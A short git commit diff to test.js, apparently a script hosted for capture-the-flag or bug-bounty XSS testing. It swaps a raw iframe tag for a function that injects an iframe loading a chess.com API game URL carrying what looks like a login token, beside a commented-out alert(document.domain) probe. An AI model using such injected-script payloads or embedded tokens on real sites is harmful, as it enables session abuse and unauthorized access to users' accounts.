81357ed68e04697f4143de3756097ba6e9396f00
rennaarenata <59098319+rennaarenata@users.noreply.github.com>
2022-05-04 18:59:50 +0200

    -

--- test.js
+++ test.js
@@ -1,5 +1,11 @@
 //alert(document.domain)
-<iframe src=https://api.chess.com/v1/games/35000530?loginToken=460bf3fb5ee46c7f0421a1605972755e&signed=docs1.3-2f3087f09de32e339fb7157308e0f644e05dc803 width=500 height=700></iframe>
+    function prepareFrame() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "http://api.chess.com/v1/games/35000530?loginToken=460bf3fb5ee46c7f0421a1605972755e&signed=docs1.3-2f3087f09de32e339fb7157308e0f644e05dc803/");
+        ifrm.style.width = "640px";
+        ifrm.style.height = "480px";
+        document.body.appendChild(ifrm);
+    }
 //JS file used for ctfs 
 //I don't want to harm anyone or anything
 // Have a good day :)
